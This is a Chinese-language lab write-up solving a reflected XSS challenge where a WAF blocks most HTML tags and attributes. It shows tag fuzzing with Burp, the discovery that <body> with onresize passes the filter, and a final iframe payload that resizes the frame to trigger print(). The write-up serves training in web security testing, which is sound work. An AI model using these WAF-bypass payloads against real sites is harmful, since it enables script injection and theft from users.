# 实验：在大多数标签和属性被阻止的 HTML 上下文中的反射型 XSS

本实验在搜索功能中包含一个反射型 XSS 漏洞，但使用了 Web 应用防火墙（WAF）来防御常见的 XSS 攻击向量。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要绕过 WAF 并调用 `print()` 函数。

> **注意**
> 你的解决方案不得要求任何用户交互。在你自己的浏览器中手动触发 `print()` 调用无法解决本实验。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=test HTTP/2
    ```

    - 响应

        ```html
        <h1>
        1 search results for 'test'
        </h1>
        ```
    
测试
- 尝试提交 HTML 元素开闭标签
    ```http
    GET /?search=test<> HTTP/2
    ```

    - 响应
        ```html
        <h1>0 search results for 'test<>'</h1>
        ```
        - 元素标签未被转义

- 尝试基础载荷，显示标签被阻拦
    `test<img src onerror=print()>`

    - 响应
        ```http
        HTTP/2 400 Bad Request

        "Tag is not allowed"
        ```
- 从 burp xss 速查表复制所有可用标签，在攻击器进行爆破
    `GET /?search=<爆破位置> HTTP/2`

    - 响应 200 的标签为 
        - `<body>` 虽然标签被浏览器去掉而不显示在 DOM 中，但实际上载荷仍可执行
        - `<xss>` 自定义标签

- 测试自定义标签的基础事件监听器
    `<xss onload=alert(1)>`

    - 响应，属性被过滤
        `"Attribute is not allowed"`

- 从 burp xss 速查表复制所有 body 可用载荷，在攻击器进行爆破
    `GET /?search=<body+爆破位置> HTTP/2`

    - 在未被过滤的载荷中测试
        - `<body oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>`
            虽然自定义标签与 `body` 可触发 JS，但无法通过挑战
        - `body` 拥有一批不常用属性，似乎仅有 `onresize` 可用

似乎无法通过 URL 链接直接进行 XSS，转为在攻击者页面加载目标页面为子框架
- 大小修改
    ```html
    <iframe src="https://实验室/?search=test<body onresize=print()>" onload="this.style.width='100px'"></iframe>
    ```
    - 目标页面的事件监听器为 body 的大小变化 `onresize`
    - 攻击者页面修改子框架的大小 `style.width`
